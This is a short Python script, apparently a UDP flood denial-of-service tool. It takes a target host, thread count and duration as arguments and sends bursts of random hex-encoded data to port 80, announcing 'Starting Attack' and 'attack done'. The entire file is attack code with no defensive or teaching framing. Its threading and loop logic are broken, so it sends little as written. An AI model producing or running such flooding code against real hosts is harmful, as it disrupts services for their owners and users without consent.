import socket, random, threading, sys, time
import os
import binascii

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('\n[+] command used: python ' + sys.argv[0] + ' <target> <threads> <time>')

timeout = time.time() + 1 * timer


def attack():
        byte = binascii.hexlify(os.urandom(1024))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            port = 80
            sock.sendto(byte * random.randint(5, 15), (target, port))
            return
        sys.exit()


print('\n[+] Starting Attack...')

for x in range(0, threads):
    threading.Thread(target=attack()).start()

print('\n[+] attack done')
